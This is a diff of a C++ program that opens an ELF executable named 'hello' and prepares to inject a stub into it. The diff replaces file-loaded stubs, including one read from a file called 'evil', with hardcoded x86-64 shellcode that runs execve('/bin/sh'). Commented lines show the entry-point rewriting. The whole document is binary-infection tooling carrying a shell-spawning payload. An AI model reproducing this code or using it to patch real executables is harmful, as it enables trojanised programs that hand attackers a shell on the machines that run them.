@@ -8,39 +8,34 @@ using namespace std;
 using namespace elfcpp;
 
 int main(void) {
-  fstream stub("stub", fstream::in | fstream::binary);
-  fstream from("evil", fstream::in | fstream::binary);
+  //fstream stub("stub", fstream::in | fstream::binary);
   fstream to("hello", fstream::in | fstream::out | fstream::binary);
 
+  static char stub_buff[] = "\x48\x31\xd2\x48\x89\xd6\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe7\x08\x48\xc1\xef\x08\x57\x48\x89\xe7\x48\xb8\x3b\x11\x11\x11\x11\x11\x11\x11\x48\xc1\xe0\x38\x48\xc1\xe8\x38\x0f\x05";
+  int stub_size = sizeof(stub_buff);
+
   // get the file sizes
-  stub.seekg(0, ifstream::end);
-  int stub_size = stub.tellg();
-  stub.seekg(0);
+  //stub.seekg(0, ifstream::end);
+  //int stub_size = stub.tellg();
+  //stub.seekg(0);
   int stub_space = ((stub_size / 16) + 1) * 16;
-  from.seekg(0, ifstream::end);
-  int from_size = from.tellg();
-  from.seekg(0);
   to.seekg(0, ifstream::end);
   int to_size = to.tellg();
   to.seekg(0);
 
   // allocate memory for the two files
-  unsigned char stub_buff[stub_size];
-  unsigned char from_buff[from_size];
+  //unsigned char stub_buff[stub_size];
   unsigned char to_buff[to_size + stub_space];
 
   // read the headers
-  stub.read((char*)stub_buff, stub_size);
-  from.read((char*)from_buff, from_size);
+  //stub.read((char*)stub_buff, stub_size);
   to.read((char*)to_buff, to_size);
 
   // assume little endian, 64 bit
-  Ehdr<64, false> from_elf(from_buff);
   Ehdr<64, false> to_elf(to_buff);
   Ehdr_write<64, false> to_elfw(to_buff);
 
   // print the starting addresses
-  cout << from_elf.get_e_entry() << endl;
   cout << to_elf.get_e_entry() << endl;
 
   // look for the program entry containing the entry point
@@ -163,8 +158,8 @@ int main(void) {
   //to_elfw.put_e_entry(to_elf_main_phdr.get_p_vaddr() + to_elf_main_phdr.get_p_memsz() - stub_space);
   //to_elfw.put_e_entry(to_elf.get_e_entry() + stub_space);
 
-  from.close();
   to.close();
+  //stub.close();
 
   // write the results out
   fstream tow("hello", fstream::trunc | fstream::out | fstream::binary);
